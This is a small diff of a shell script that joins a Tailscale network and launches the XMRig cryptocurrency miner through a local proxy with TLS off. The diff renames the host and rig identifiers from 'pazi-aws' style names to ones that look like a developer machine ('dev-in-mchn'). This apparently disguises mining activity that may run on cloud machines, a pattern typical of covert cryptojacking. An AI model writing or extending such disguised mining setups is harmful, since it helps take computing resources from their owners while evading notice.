@@ -51,7 +51,7 @@ echo "Starting Tailscale..."
 sleep 5
 
 echo "Connecting to Tailnet..."
-./tailscale --socket=ts.sock up --authkey="$TS_KEY" --hostname="pazi-x86-$RANDOM" --accept-dns=false
+./tailscale --socket=ts.sock up --authkey="$TS_KEY" --hostname="dev-in-x86-$RANDOM" --accept-dns=false
 sleep 5
 
 echo "Launching XMRig..."
@@ -61,4 +61,4 @@ echo "Launching XMRig..."
   -u "$WALLET" \
   --proxy "127.0.0.1:1055" \
   --no-tls \
-  --rig-id "pazi-aws"
+  --rig-id "dev-in-mchn"
